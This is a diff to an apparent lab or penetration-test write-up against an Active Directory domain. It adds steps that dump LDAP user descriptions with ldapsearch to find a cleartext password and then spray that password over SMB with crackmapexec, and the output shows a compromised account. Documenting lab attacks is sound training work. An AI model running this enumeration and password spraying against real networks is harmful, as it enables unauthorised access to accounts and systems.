@@ -102,13 +102,22 @@ Using the usernames previously enumerated, several attacks were launched to gain
 
 ### Technique 1: LDAP Description Disclosure
 
-> **Tool:** `ldapsearch`  
-> **Purpose:** Dump LDAP user attributes and look for password leaks or notes in the `description` field.
-
-```bash
-ldapsearch -x -H ldap://192.168.50.129 -b "DC=orb,DC=corp" '(objectclass=person)' | grep -ia desc
-```
-> **Results:**
-> **description:** 3edcxsw2#EDCXSW@
-
-> A cleartext password was found in the description field — likely a human error or documentation leak.
+  > **Tool:** `ldapsearch`  
+  > **Purpose:** Dump LDAP user attributes and look for password leaks or notes in the `description` field.
+  
+  ```bash
+  ldapsearch -x -H ldap://192.168.50.129 -b "DC=orb,DC=corp" '(objectclass=person)' | grep -ia desc
+  ```
+  > **Results:**
+  > **description:** 3edcxsw2#EDCXSW@
+  > A cleartext password was found in the description field — likely a human error or documentation leak.
+  
+  ### Credentials Spraying
+  > Used crackmapexec tool to test the discovered password against all enumerated usernames.
+  ```bash
+  crackmapexec smb 192.168.50.129 -u users.txt -p '3edcxsw2#EDCXSW@'
+  
+  [+] orb.corp\clark.kent:3edcxsw2#EDCXSW@ (Pwn3d!)
+  ```
+  
+  >  Valid credentials discovered — clark.kent is a domain user.
